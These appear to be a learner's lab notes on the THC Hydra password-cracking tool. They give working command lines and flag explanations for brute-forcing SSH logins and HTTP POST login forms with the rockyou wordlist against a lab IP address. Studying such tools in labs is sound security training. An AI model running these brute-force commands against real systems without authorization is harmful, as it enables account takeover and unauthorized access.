official repo: https://github.com/vanhauser-thc/thc-hydra


### SSH

SSH: `hydra -l <username> -P <full path to pass> 10.10.214.198 -t 4 ssh`

#### EXAMPLE THAT WORKED:
``hydra -l molly -P /usr/share/wordlists/rockyou.txt  10.10.214.198 -t 4 ssh``

-----------

Option 	Description
-l 	specifies the (SSH) username for login
-P 	indicates a list of passwords
-t 	sets the number of threads to spawn

### Post Web Form

``sudo hydra <username> <wordlist> 10.10.214.198 http-post-form "<path>:<login_credentials>:<invalid_response>"``

#### EXAMPLE THAT WORKED:
``hydra -l molly -P /usr/share/wordlists/rockyou.txt  10.10.214.198 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V``

-------------



Option 	Description
``-l`` 	the username for (web form) login
``-P`` 	the password list to use
``http-post-form`` 	the type of the form is POST

<path> 	the login page URL, for example, login.php

<login_credentials> 	the username and password used to log in, for example, username=^USER^&password=^PASS^

<invalid_response> 	part of the response when the login fails
-V 	verbose output for every attempt

EXAMPLE: 
hydra -l <username> -P <wordlist> 10.10.214.198 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V


    The login page is only /, i.e., the main IP address.
    The username is the form field where the username is entered
    The specified username(s) will replace ^USER^
    The password is the form field where the password is entered
    The provided passwords will be replacing ^PASS^
    Finally, F=incorrect is a string that appears in the server reply when the login fails
